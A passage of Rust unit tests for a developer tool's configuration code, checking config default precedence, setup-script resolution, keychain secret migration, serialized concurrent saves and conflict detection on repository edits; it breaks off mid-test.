        // Fields already present in the .tuic.json base (manually set, or a team
        // value) win over the global default and must not be clobbered.
        // mcp_upstreams has no global default, so it stays exactly as-is.
        let base = RepoLocalConfig {
            base_branch: Some("release".to_string()),
            mcp_upstreams: Some(vec!["github".to_string()]),
            ..RepoLocalConfig::default()
        };
        let mut defaults: RepoDefaultsConfig = serde_json::from_str("{}").unwrap();
        defaults.base_branch = "develop".to_string();

        let filled = fill_repo_local_defaults(base, &defaults);
        assert_eq!(filled.base_branch.as_deref(), Some("release"));
        assert_eq!(
            filled.mcp_upstreams.as_deref(),
            Some(&["github".to_string()][..])
        );
        // A field neither set in base nor overridden gets the global default.
        assert!(filled.worktree_storage.is_some());
    }

    #[test]
    fn export_precedence_per_repo_over_defaults() {
        // Mirrors save_repo_local_config: fill defaults, then overlay per-repo.
        // Per-repo override must win; non-overridden fields keep the default.
        let mut defaults: RepoDefaultsConfig = serde_json::from_str("{}").unwrap();
        defaults.base_branch = "develop".to_string();
        let entry = RepoSettingsEntry {
            base_branch: Some("feature".to_string()),
            ..RepoSettingsEntry::default()
        };

        let base = fill_repo_local_defaults(RepoLocalConfig::default(), &defaults);
        let merged = overlay_repo_local_config(base, &entry);
        assert_eq!(merged.base_branch.as_deref(), Some("feature"));
        assert!(merged.worktree_storage.is_some());
    }

    #[test]
    #[serial_test::serial]
    fn get_note_images_dir_returns_path() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        let result = get_note_images_dir();
        assert!(
            result.ends_with("note-images"),
            "Should end with note-images, got: {result}"
        );
    }

    #[cfg(unix)]
    #[test]
    fn copy_dir_recursive_preserves_symlinks() {
        let src = TempDir::new().unwrap();
        let dst = TempDir::new().unwrap();

        // Create a real file and a symlink to it
        let real_file = src.path().join("real.txt");
        fs::write(&real_file, "hello").unwrap();
        let link_path = src.path().join("link.txt");
        std::os::unix::fs::symlink(&real_file, &link_path).unwrap();

        // Create a real subdir and a symlink to it
        let sub = src.path().join("subdir");
        fs::create_dir(&sub).unwrap();
        fs::write(sub.join("inner.txt"), "world").unwrap();
        let dir_link = src.path().join("dir-link");
        std::os::unix::fs::symlink(&sub, &dir_link).unwrap();

        let dest = dst.path().join("out");
        copy_dir_recursive(src.path(), &dest).unwrap();

        // Verify the file symlink was recreated (not copied as a regular file)
        let dest_link = dest.join("link.txt");
        assert!(
            dest_link
                .symlink_metadata()
                .unwrap()
                .file_type()
                .is_symlink()
        );
        assert_eq!(fs::read_link(&dest_link).unwrap(), real_file);

        // Verify the dir symlink was recreated
        let dest_dir_link = dest.join("dir-link");
        assert!(
            dest_dir_link
                .symlink_metadata()
                .unwrap()
                .file_type()
                .is_symlink()
        );
        assert_eq!(fs::read_link(&dest_dir_link).unwrap(), sub);

        // Verify the real file was copied normally
        assert!(
            !dest
                .join("real.txt")
                .symlink_metadata()
                .unwrap()
                .file_type()
                .is_symlink()
        );
        assert_eq!(fs::read_to_string(dest.join("real.txt")).unwrap(), "hello");
    }

    #[test]
    fn resolve_setup_script_per_repo_override() {
        let mut settings = RepoSettingsMap::default();
        settings.repos.insert(
            "/repo".to_string(),
            RepoSettingsEntry {
                setup_script: Some("pnpm install".to_string()),
                ..RepoSettingsEntry::default()
            },
        );
        let defaults = RepoDefaultsConfig::default();
        assert_eq!(
            resolve_setup_script_from(&settings, &defaults, "/repo"),
            Some("pnpm install".to_string()),
        );
    }

    #[test]
    fn resolve_setup_script_falls_through_to_defaults() {
        let settings = RepoSettingsMap::default();
        let defaults = RepoDefaultsConfig {
            setup_script: "npm install".to_string(),
            ..RepoDefaultsConfig::default()
        };
        assert_eq!(
            resolve_setup_script_from(&settings, &defaults, "/repo"),
            Some("npm install".to_string()),
        );
    }

    #[test]
    fn resolve_setup_script_empty_override_blocks_default() {
        let mut settings = RepoSettingsMap::default();
        settings.repos.insert(
            "/repo".to_string(),
            RepoSettingsEntry {
                setup_script: Some(String::new()),
                ..RepoSettingsEntry::default()
            },
        );
        let defaults = RepoDefaultsConfig {
            setup_script: "npm install".to_string(),
            ..RepoDefaultsConfig::default()
        };
        assert_eq!(
            resolve_setup_script_from(&settings, &defaults, "/repo"),
            None,
        );
    }

    #[test]
    fn resolve_setup_script_no_config_returns_none() {
        let settings = RepoSettingsMap::default();
        let defaults = RepoDefaultsConfig::default();
        assert_eq!(
            resolve_setup_script_from(&settings, &defaults, "/repo"),
            None,
        );
    }

    #[test]
    fn resolve_setup_script_null_override_falls_through() {
        let mut settings = RepoSettingsMap::default();
        settings.repos.insert(
            "/repo".to_string(),
            RepoSettingsEntry {
                setup_script: None,
                ..RepoSettingsEntry::default()
            },
        );
        let defaults = RepoDefaultsConfig {
            setup_script: "yarn install".to_string(),
            ..RepoDefaultsConfig::default()
        };
        assert_eq!(
            resolve_setup_script_from(&settings, &defaults, "/repo"),
            Some("yarn install".to_string()),
        );
    }

    // --- Vault-backed secrets: failure must never look like absence (#488-5576) ---

    /// Restore the read-fault flag even if the test panics, so one failure cannot
    /// cascade into every later test in the binary.
    struct ReadFaultGuard;
    impl Drop for ReadFaultGuard {
        fn drop(&mut self) {
            crate::credentials::MOCK_FAIL_READS.store(false, std::sync::atomic::Ordering::SeqCst);
        }
    }
    fn fail_vault_reads() -> ReadFaultGuard {
        crate::credentials::MOCK_FAIL_READS.store(true, std::sync::atomic::Ordering::SeqCst);
        ReadFaultGuard
    }

    /// The core of the bug: a keychain that cannot be read used to be indistinguishable
    /// from a keychain holding nothing. `*_exists` went false, which made
    /// `preserve_redacted_app_config_secrets` skip the field, and the next save reached
    /// the one `persist_secret` branch that calls `credentials::delete`.
    #[test]
    fn a_vault_read_failure_keeps_the_exists_flag() {
        let _fault = fail_vault_reads();
        let mut plaintext = String::new();

        let out = hydrate_one_secret(
            crate::credentials::Credential::RemoteSessionToken,
            &mut plaintext,
            true, // config.json said a secret is there
            "session token",
        );

        assert!(
            out.exists,
            "an unreadable vault must not be reported as an absent secret"
        );
        assert!(!out.migrated);
    }

    /// And the flag it keeps is what makes deletion unreachable: `persist_secret` with
    /// an empty value returns early on `exists == true` instead of deleting.
    #[test]
    fn keeping_the_flag_stops_the_next_save_from_deleting_the_secret() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        crate::credentials::set(
            crate::credentials::Credential::RemoteSessionToken,
            "live-token",
        )
        .expect("seed vault");

        // exists=true is what a read failure now preserves.
        let kept = persist_secret(crate::credentials::Credential::RemoteSessionToken, "", true)
            .expect("persist");
        assert!(kept);
        assert_eq!(
            crate::credentials::get(crate::credentials::Credential::RemoteSessionToken)
                .expect("vault readable"),
            Some("live-token".to_string()),
            "the secret must survive a save that could not read it"
        );

        // The contrast: a genuinely absent secret (exists=false) still gets cleaned up.
        let kept = persist_secret(
            crate::credentials::Credential::RemoteSessionToken,
            "",
            false,
        )
        .expect("persist");
        assert!(!kept);
        assert_eq!(
            crate::credentials::get(crate::credentials::Credential::RemoteSessionToken)
                .expect("vault readable"),
            None
        );
    }

    /// A genuine absence is still reported as absence — the fix must not make every
    /// missing secret look present forever.
    #[test]
    fn a_genuinely_absent_secret_clears_the_flag() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let _ = crate::credentials::delete(crate::credentials::Credential::RelayToken);

        let mut plaintext = String::new();
        let out = hydrate_one_secret(
            crate::credentials::Credential::RelayToken,
            &mut plaintext,
            true,
            "relay token",
        );
        assert!(!out.exists, "vault answered 'not there' — believe it");
    }

    /// Plaintext still in config.json must move into the vault AND flag the file for
    /// rewriting, otherwise the cleartext copy survives on disk indefinitely.
    #[test]
    fn plaintext_migration_reports_that_the_file_must_be_rewritten() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        let mut cfg = AppConfig::default();
        cfg.services.auth.session_token = "legacy-plaintext".to_string();

        assert!(
            hydrate_app_config_secrets(&mut cfg),
            "a migration must ask for a rewrite"
        );
        assert_eq!(
            crate::credentials::get(crate::credentials::Credential::RemoteSessionToken)
                .expect("vault readable"),
            Some("legacy-plaintext".to_string())
        );
        assert!(cfg.services.auth.session_token_exists);
    }

    /// Nothing to migrate → no rewrite. Loading the config must not write to disk on
    /// every start.
    #[test]
    fn a_plain_load_does_not_ask_for_a_rewrite() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let _ = crate::credentials::delete(crate::credentials::Credential::RemoteSessionToken);
        let _ = crate::credentials::delete(crate::credentials::Credential::RelayToken);
        let _ = crate::credentials::delete(crate::credentials::Credential::PushVapidPrivateKey);

        let mut cfg = AppConfig::default();
        assert!(!hydrate_app_config_secrets(&mut cfg));
    }

    // --- Serialized writes (#488-5576) ---

    /// Rotation used to update `state.session_token` and the file but never
    /// `state.config`. A later unrelated save then wrote the stale in-memory token back
    /// to the vault, resurrecting the credential the user had just rotated away.
    #[test]
    fn rotation_survives_a_later_unrelated_save() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let state = crate::state::tests_support::make_test_app_state();

        let rotated = rotate_session_token(&state).expect("rotate");
        assert_eq!(*state.session_token.read(), rotated);
        assert_eq!(
            state.config.read().services.auth.session_token,
            rotated,
            "the in-memory config must carry the new token, not the old one"
        );

        // An unrelated save that says nothing about tokens.
        commit_config_change(&state, |current| {
            let mut next = current.clone();
            next.font_size = 18;
            Ok(next)
        })
        .expect("unrelated save");

        assert_eq!(
            crate::credentials::get(crate::credentials::Credential::RemoteSessionToken)
                .expect("vault readable"),
            Some(rotated.clone()),
            "the unrelated save must not resurrect the pre-rotation token"
        );
        assert_eq!(state.config.read().font_size, 18);
    }

    /// Lost update: two writers used to read the same snapshot and the second one's
    /// write erased the first one's field. Serializing read-merge-persist keeps both.
    #[test]
    fn concurrent_saves_do_not_lose_each_other() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let state = std::sync::Arc::new(crate::state::tests_support::make_test_app_state());

        let a = {
            let state = state.clone();
            std::thread::spawn(move || {
                for _ in 0..20 {
                    commit_config_change(&state, |c| {
                        let mut n = c.clone();
                        n.font_size = 18;
                        Ok(n)
                    })
                    .expect("save a");
                }
            })
        };
        let b = {
            let state = state.clone();
            std::thread::spawn(move || {
                for _ in 0..20 {
                    commit_config_change(&state, |c| {
                        let mut n = c.clone();
                        n.services.server.enabled = true;
                        Ok(n)
                    })
                    .expect("save b");
                }
            })
        };
        a.join().expect("thread a");
        b.join().expect("thread b");

        let final_cfg = state.config.read().clone();
        assert_eq!(final_cfg.font_size, 18, "writer A's field was lost");
        assert!(
            final_cfg.services.server.enabled,
            "writer B's field was lost"
        );

        // And disk agrees with memory — the last write in the lock is the one persisted.
        let on_disk = load_app_config();
        assert_eq!(on_disk.font_size, 18);
        assert!(on_disk.services.server.enabled);
    }

    /// `load_app_config`'s secret-migration branch calls `save_app_config` directly,
    /// with no lock of its own. Before the lock-ownership split this raced against
    /// `commit_config_change`'s critical section; now `save_app_config` acquires
    /// `CONFIG_WRITE_LOCK` itself, so a concurrent call blocks until the in-progress
    /// commit releases it.
    #[test]
    fn secret_migration_save_serializes_with_concurrent_commit() {
        use std::sync::{Arc, Mutex};
        use std::thread;
        use std::time::Duration;

        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let state = Arc::new(crate::state::tests_support::make_test_app_state());
        let log: Arc<Mutex<Vec<&'static str>>> = Arc::new(Mutex::new(Vec::new()));

        let commit = {
            let state = state.clone();
            let log = log.clone();
            thread::spawn(move || {
                commit_config_change(&state, |c| {
                    log.lock().unwrap().push("a_holding_lock");
                    thread::sleep(Duration::from_millis(200));
                    let mut n = c.clone();
                    n.font_size = 18;
                    Ok(n)
                })
                .expect("commit");
                log.lock().unwrap().push("a_done");
            })
        };

        // Give the commit thread time to acquire CONFIG_WRITE_LOCK and enter its
        // sleep before starting the "unprotected" migration-style save.
        thread::sleep(Duration::from_millis(50));

        let migration_save = {
            let state = state.clone();
            let log = log.clone();
            thread::spawn(move || {
                let cfg = state.config.read().clone();
                log.lock().unwrap().push("b_start");
                save_app_config(cfg).expect("save b");
                log.lock().unwrap().push("b_done");
            })
        };

        commit.join().expect("commit thread");
        migration_save.join().expect("migration_save thread");

        let log = log.lock().unwrap();
        let pos = |needle: &str| log.iter().position(|e| *e == needle).expect(needle);
        assert!(
            pos("b_start") < pos("a_done"),
            "test setup invalid — b did not attempt while a held the lock: {log:?}"
        );
        assert!(
            pos("b_done") > pos("a_done"),
            "save_app_config completed while commit_config_change still held \
             CONFIG_WRITE_LOCK — the two writers raced instead of serializing: {log:?}"
        );
    }

    /// The test above proves the migration branch's *write* serializes against a
    /// concurrent writer. This proves the branch's *read* does too: `load_app_config`
    /// reads config.json before any lock is acquired, so a concurrent writer's newer
    /// value can land on disk between that read and the migration write — which then
    /// republishes the stale value it already had in hand, silently reverting the
    /// concurrent writer's update. The concurrent writer here is `ConfigFile::update`
    /// (not `commit_config_change`, which derives its payload from `state.config` and
    /// would overwrite our disk-seeded plaintext secret with the default, empty one and
    /// defeat the migration trigger).
    #[test]
    #[serial_test::serial]
    fn secret_migration_read_is_atomic_with_a_concurrent_writer() {
        use std::sync::{Arc, Mutex};
        use std::thread;
        use std::time::Duration;

        crate::credentials::reset_test_faults();
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        let mut seed = AppConfig::default();
        seed.services.auth.session_token = "plaintext-secret".to_string();
        seed.font_size = 1;
        std::fs::write(
            dir.path().join(APP_CONFIG_FILE),
            serde_json::to_string_pretty(&seed).unwrap(),
        )
        .unwrap();

        let log: Arc<Mutex<Vec<&'static str>>> = Arc::new(Mutex::new(Vec::new()));

        let writer = {
            let log = log.clone();
            thread::spawn(move || {
                ConfigFile::<AppConfig>::new(APP_CONFIG_FILE)
                    .update(|cfg| {
                        log.lock().unwrap().push("a_holding_lock");
                        thread::sleep(Duration::from_millis(200));
                        cfg.font_size = 99;
                        true
                    })
                    .expect("writer update");
                log.lock().unwrap().push("a_done");
            })
        };

        // Give the writer time to acquire CONFIG_WRITE_LOCK and enter its sleep
        // before starting the unprotected migration read.
        thread::sleep(Duration::from_millis(50));

        let reader = {
            let log = log.clone();
            thread::spawn(move || {
                log.lock().unwrap().push("b_start");
                let cfg = load_app_config();
                log.lock().unwrap().push("b_done");
                cfg
            })
        };

        writer.join().expect("writer thread");
        let seen = reader.join().expect("reader thread");

        {
            let log = log.lock().unwrap();
            let pos = |needle: &str| log.iter().position(|e| *e == needle).expect(needle);
            assert!(
                pos("b_start") < pos("a_done"),
                "test setup invalid — the reader did not attempt while the writer held \
                 the lock: {log:?}"
            );
        }

        assert_eq!(
            seen.font_size, 99,
            "load_app_config's own return value still carries the value it read before \
             the concurrent writer finished — the read and the migration write must be \
             one atomic critical section"
        );
        let on_disk: AppConfig = serde_json::from_str(
            &std::fs::read_to_string(dir.path().join(APP_CONFIG_FILE)).unwrap(),
        )
        .unwrap();
        assert_eq!(
            on_disk.font_size, 99,
            "the migration branch's write clobbered the concurrent writer's newer \
             value on disk with the stale value load_app_config read earlier"
        );
    }

    #[test]
    #[serial_test::serial]
    fn repository_delta_updates_one_id_without_losing_layout_or_other_records() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let repo_a = serde_json::json!({"path":"/a","displayName":"A","branches":{}});
        let repo_b = serde_json::json!({"path":"/b","displayName":"B","branches":{}});
        replace_repositories_for_test(serde_json::json!({
            "repos": {"/a": repo_a.clone(), "/b": repo_b.clone()},
            "repoOrder": ["/a", "/b"],
            "activeRepoPath": "/b",
            "groups": {"g": {"id":"g","name":"Work","repoOrder":["/b"]}},
            "groupOrder": ["g"],
            "migrationMarker": {"keep": true}
        }))
        .expect("seed repositories");

        let repo_a_updated = serde_json::json!({
            "path":"/a",
            "displayName":"Renamed A",
            "branches":{}
        });
        save_repositories(serde_json::json!({
            "mutationVersion": 1,
            "repos": [{"id":"/a","before":repo_a,"after":repo_a_updated.clone()}],
            "groups": []
        }))
        .expect("apply repository delta");

        let saved = load_repositories();
        assert_eq!(saved["repos"]["/a"], repo_a_updated);
        assert_eq!(saved["repos"]["/b"], repo_b);
        assert_eq!(saved["repoOrder"], serde_json::json!(["/a", "/b"]));
        assert_eq!(saved["activeRepoPath"], serde_json::json!("/b"));
        assert_eq!(saved["groups"]["g"]["name"], serde_json::json!("Work"));
        assert_eq!(saved["groupOrder"], serde_json::json!(["g"]));
        assert_eq!(saved["migrationMarker"], serde_json::json!({"keep":true}));
    }

    #[test]
    #[serial_test::serial]
    fn repository_delta_rejects_a_stale_same_record_update_without_overwriting_it() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let original = serde_json::json!({"path":"/repo","displayName":"Original","branches":{}});
        replace_repositories_for_test(serde_json::json!({
            "repos": {"/repo": original.clone()},
            "repoOrder": ["/repo"]
        }))
        .expect("seed repositories");

        let first = serde_json::json!({"path":"/repo","displayName":"First","branches":{}});
        save_repositories(serde_json::json!({
            "mutationVersion": 1,
            "repos": [{"id":"/repo","before":original.clone(),"after":first.clone()}],
            "groups": []
        }))
        .expect("first update");

        let second = serde_json::json!({"path":"/repo","displayName":"Second","branches":{}});
        let error = save_repositories(serde_json::json!({
            "mutationVersion": 1,
            "repos": [{"id":"/repo","before":original,"after":second}],
            "groups": []
        }))
        .expect_err("stale update must conflict");

        assert!(
            error.contains("repository configuration conflict"),
            "{error}"
        );
        assert!(error.contains("/repo"), "{error}");
        assert_eq!(load_repositories()["repos"]["/repo"], first);
    }

    #[test]
    #[serial_test::serial]
    fn independent_repository_additions_merge_their_order_membership() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        replace_repositories_for_test(serde_json::json!({
            "repos": {}, "repoOrder": [], "groups": {}, "groupOrder": []
        }))
        .expect("seed repositories");

        for (path, name) in [("/a", "A"), ("/b", "B")] {
            save_repositories(serde_json::json!({
                "mutationVersion": 1,
                "repos": [{
                    "id": path,
                    "before": null,
                    "after": {"path":path,"displayName":name,"branches":{}}
                }],
                "groups": [],
                "repoOrder": {"before":[],"after":[path]}
            }))
            .expect("independent add must compose");
        }

        let saved = load_repositories();
        assert_eq!(saved["repos"].as_object().map(|repos| repos.len()), Some(2));
        let order = saved["repoOrder"].as_array().expect("repoOrder array");
        assert!(order.contains(&serde_json::json!("/a")));
        assert!(order.contains(&serde_json::json!("/b")));
    }

    #[test]
    #[serial_test::serial]
    fn independent_group_additions_merge_their_order_membership() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        replace_repositories_for_test(serde_json::json!({
            "repos": {}, "repoOrder": [], "groups": {}, "groupOrder": []
        }))
        .expect("seed repositories");

        for (id, name) in [("a", "Alpha"), ("b", "Beta")] {
            save_repositories(serde_json::json!({
                "mutationVersion": 1,
                "repos": [],
                "groups": [{
                    "id": id,
                    "before": null,
                    "after": {"id":id,"name":name,"color":"","collapsed":false,"repoOrder":[]}
                }],
                "groupOrder": {"before":[],"after":[id]}
            }))
            .expect("independent group add must compose");
        }

        let saved = load_repositories();
        assert_eq!(
            saved["groups"].as_object().map(|groups| groups.len()),
            Some(2)
        );
        let order = saved["groupOrder"].as_array().expect("groupOrder array");
        assert!(order.contains(&serde_json::json!("a")));
        assert!(order.contains(&serde_json::json!("b")));
    }

    #[test]
    #[serial_test::serial]
    fn group_order_and_active_selection_conflicts_are_explicit() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let group = serde_json::json!({
            "id":"g", "name":"Original", "color":"", "collapsed":false, "repoOrder":[]
        });
        replace_repositories_for_test(serde_json::json!({
            "repos": {
                "/a":{"path":"/a"},
                "/b":{"path":"/b"},
                "/c":{"path":"/c"}
            },
            "repoOrder": ["/a", "/b", "/c"],
            "activeRepoPath": "/a",
            "groups": {"g":group.clone()},
            "groupOrder": ["g"]
        }))
        .expect("seed repositories");

        let renamed = serde_json::json!({
            "id":"g", "name":"Renamed", "color":"", "collapsed":false, "repoOrder":[]
        });
        save_repositories(serde_json::json!({
            "mutationVersion":1,
            "repos":[],
            "groups":[{"id":"g","before":group.clone(),"after":renamed}]
        }))
        .expect("rename group");
        let group_error = save_repositories(serde_json::json!({
            "mutationVersion":1,
            "repos":[],
            "groups":[{
                "id":"g",
                "before":group,
                "after":{"id":"g","name":"Original","color":"#fff","collapsed":false,"repoOrder":[]}
            }]
        }))
        .expect_err("stale group update must conflict");
        assert!(group_error.contains("group 'g'"), "{group_error}");

        save_repositories(serde_json::json!({
            "mutationVersion":1,
            "repos":[],
            "groups":[],
            "activeRepoPath":{"before":"/a","after":"/b"}
        }))
        .expect("change active repository");
        let active_error = save_repositories(serde_json::json!({
            "mutationVersion":1,
            "repos":[],
            "groups":[],
            "activeRepoPath":{"before":"/a","after":"/c"}
        }))
        .expect_err("stale active selection must conflict");
        assert!(active_error.contains("active repository"), "{active_error}");

        save_repositories(serde_json::json!({
            "mutationVersion":1,
            "repos":[],
            "groups":[],
            "repoOrder":{"before":["/a","/b","/c"],"after":["/b","/a","/c"]}
        }))
        .expect("first reorder");
        let order_error = save_repositories(serde_json::json!({
            "mutationVersion":1,
            "repos":[],
            "groups":[],
            "repoOrder":{"before":["/a","/b","/c"],"after":["/a","/c","/b"]}
        }))
        .expect_err("incompatible reorder must conflict");
        assert!(order_error.contains("repoOrder"), "{order_error}");
    }

    /// Seed one repository whose single branch carries a diffstat, and hand back
    /// a builder for "the same record with these fields overridden" — the shape
    /// every derived-field test needs on both sides of a mutation.
    fn seed_repo_with_diffstat(additions: i64, display_name: &str) -> serde_json::Value {
        seed_repo_with_diffstat_keyed("branches", additions, display_name)
    }

    /// The same record under either entry key. `branches` is what a document
    /// written before workspaces existed holds; `workspaces` is what every client
    /// writes after the identity migration. Both must be stripped of their derived
    /// fields, or the drift storm this whole mechanism exists to prevent comes back
    /// the moment a user's config is migrated.
    fn seed_repo_with_diffstat_keyed(
        entries_key: &str,
        additions: i64,
        display_name: &str,
    ) -> serde_json::Value {
        serde_json::json!({
            "path": "/ego",
            "displayName": display_name,
            "activeBranch": "master",
            entries_key: {
                "master": {
                    "workspaceId": "master",
                    "branchName": "master",
                    "additions": additions,
                    "deletions": 2787,
                    "isMerged": false,
                    "lastActiveTerminal": "term-261",
                    "lastCommitTs": 1788155882000i64,
                    "terminals": []
                }
            }
        })
    }

    #[test]
    #[serial_test::serial]
    fn a_drifted_diffstat_under_the_workspaces_key_does_not_block_an_intent_change() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        replace_repositories_for_test(serde_json::json!({
            "repos": {"/ego": seed_repo_with_diffstat_keyed("workspaces", 357, "ego")},
            "repoOrder": ["/ego"], "groups": {}, "groupOrder": []
        }))
        .expect("seed repositories");

        save_repositories(serde_json::json!({
            "mutationVersion": 1,
            "repos": [{
                "id": "/ego",
                "before": seed_repo_with_diffstat_keyed("workspaces", 331, "ego"),
                "after": seed_repo_with_diffstat_keyed("workspaces", 331, "Ego renamed")
            }],
            "groups": []
        }))
        .expect("a stale diffstat must not reject a rename under the workspaces key");

        assert_eq!(
            load_repositories()["repos"]["/ego"]["displayName"],
            "Ego renamed"
        );
    }

    #[test]
    #[serial_test::serial]
    fn a_competing_edit_under_the_workspaces_key_still_conflicts() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        replace_repositories_for_test(serde_json::json!({
            "repos": {"/ego": seed_repo_with_diffstat_keyed("workspaces", 331, "Renamed elsewhere")},
            "repoOrder": ["/ego"], "groups": {}, "groupOrder": []
        }))
        .expect("seed repositories");

        let error = save_repositories(serde_json::json!({
            "mutationVersion": 1,
            "repos": [{
                "id": "/ego",
                "before": seed_repo_with_diffstat_keyed("workspaces", 331, "ego"),
                "after": seed_repo_with_diffstat_keyed("workspaces", 331, "Renamed here")
            }],
            "groups": []
        }))
        .expect_err("stripping derived fields must not swallow a real competing edit");
        assert!(error.contains("repository '/ego'"), "{error}");
    }

    /// The one save that crosses the migration: disk still holds `branches`, the
    /// client's baseline is the document it read from disk, and the record it
    /// writes back is workspace-keyed. Reject this and a user who upgrades can
    /// never save again.
    #[test]
    #[serial_test::serial]
    fn the_save_that_migrates_branches_to_workspaces_is_accepted() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        replace_repositories_for_test(serde_json::json!({
            "repos": {"/ego": seed_repo_with_diffstat_keyed("branches", 331, "ego")},
            "repoOrder": ["/ego"], "groups": {}, "groupOrder": []
        }))
        .expect("seed repositories");

        save_repositories(serde_json::json!({
            "mutationVersion": 1,
            "repos": [{
                "id": "/ego",
                "before": seed_repo_with_diffstat_keyed("branches", 331, "ego"),
                "after": seed_repo_with_diffstat_keyed("workspaces", 331, "ego")
            }],
            "groups": []
        }))
        .expect("the migrating save must be accepted");

        let saved = load_repositories();
        assert!(saved["repos"]["/ego"]["workspaces"].is_object(), "{saved}");
        assert!(saved["repos"]["/ego"]["branches"].is_null(), "{saved}");
    }

    #[test]
    #[serial_test::serial]
    fn a_derived_field_that_drifted_under_us_does_not_block_an_intent_change() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        // Disk already moved on: another window recomputed the diffstat.
        replace_repositories_for_test(serde_json::json!({
            "repos": {"/ego": seed_repo_with_diffstat(357, "ego")},
            "repoOrder": ["/ego"], "groups": {}, "groupOrder": []
        }))
        .expect("seed repositories");

        // This window still believes 331, and wants to rename the repo.
        save_repositories(serde_json::json!({
            "mutationVersion": 1,
            "repos": [{
                "id": "/ego",
                "before": seed_repo_with_diffstat(331, "ego"),
                "after": seed_repo_with_diffstat(331, "Ego renamed")
            }],
            "groups": []
        }))
        .expect("a stale diffstat must not reject a rename");

        let saved = load_repositories();
        assert_eq!(saved["repos"]["/ego"]["displayName"], "Ego renamed");
    }

    #[test]
    #[serial_test::serial]
    fn a_competing_edit_to_an_intent_field_still_conflicts() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        // Another window renamed it — a real competing edit, not a recomputed number.
        replace_repositories_for_test(serde_json::json!({
            "repos": {"/ego": seed_repo_with_diffstat(331, "Renamed elsewhere")},
            "repoOrder": ["/ego"], "groups": {}, "groupOrder": []
        }))
        .expect("seed repositories");

        let error = save_repositories(serde_json::json!({
            "mutationVersion": 1,
            "repos": [{
                "id": "/ego",
                "before": seed_repo_with_diffstat(331, "ego"),
                "after": seed_repo_with_diffstat(331, "Renamed here")
            }],
            "groups": []
        }))
        .expect_err("a competing rename must still conflict");
        assert!(error.contains("repository '/ego'"), "{error}");
    }

    #[test]
    #[serial_test::serial]
    fn a_change_confined_to_derived_fields_still_persists() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        replace_repositories_for_test(serde_json::json!({
            "repos": {"/ego": seed_repo_with_diffstat(331, "ego")},
            "repoOrder": ["/ego"], "groups": {}, "groupOrder": []
        }))
        .expect("seed repositories");

        // Ignoring derived fields in the conflict check must not make them
        // unwritable: the sidebar cache still has to move.
        save_repositories(serde_json::json!({
            "mutationVersion": 1,
            "repos": [{
                "id": "/ego",
                "before": seed_repo_with_diffstat(331, "ego"),
                "after": seed_repo_with_diffstat(357, "ego")
            }],
            "groups": []
        }))
        .expect("a derived-only update must persist");

        let saved = load_repositories();
        assert_eq!(
            saved["repos"]["/ego"]["branches"]["master"]["additions"],
            357
        );
    }

    // ── Stale-temp repository classifier / repair (#763-d219) ─────────────

    /// A nonexistent path guaranteed to fall under a recognized temp root on
    /// any machine running this test — `std::env::temp_dir()` itself, not a
    /// hardcoded `/tmp`, so it matches whatever this OS/CI actually resolves.
    fn stale_temp_candidate_path() -> String {
        std::env::temp_dir()
            .join("tuic-763-d219-stale-repo-does-not-exist")
            .to_string_lossy()
            .to_string()
    }

    fn shell_workspace_json() -> serde_json::Value {
        serde_json::json!({
            "workspaceId": "main",
            "branchName": "main",
            "kind": "main",
            "isMain": false,
            "isShell": true,
            "parentRepoPath": null,
            "worktreePath": null,
            "terminals": [],
            "savedTerminals": [],
            "hadTerminals": false,
            "lastActiveTerminal": null,
            "additions": 0,
            "deletions": 0,
            "isMerged": false,
            "lastCommitTs": null,
        })
    }

    /// A repository record matching every criterion of the classifier —
    /// mutate a clone of this in each "survives" test to flip exactly one
    /// criterion and prove it alone is enough to spare the row.
    fn stale_temp_repo_json(path: &str) -> serde_json::Value {
        serde_json::json!({
            "path": path,
            "displayName": "stale-repo",
            "initials": "",
            "isGitRepo": false,
            "expanded": true,
            "collapsed": false,
            "parked": false,
            "workspaces": { "main": shell_workspace_json() },
            "activeWorkspaceId": "main",
        })
    }

    #[test]
    fn classifies_a_ghost_matching_every_criterion() {
        let path = stale_temp_candidate_path();
        let repo = stale_temp_repo_json(&path);
        let candidate =
            classify_stale_temp_repo(&path, &repo).expect("must classify as stale-temp");
        assert_eq!(candidate.path, path);
        assert_eq!(candidate.display_name, "stale-repo");
    }

    #[test]
    fn survives_when_the_local_path_exists() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().to_string_lossy().to_string();
        let repo = stale_temp_repo_json(&path);
        assert!(
            classify_stale_temp_repo(&path, &repo).is_none(),
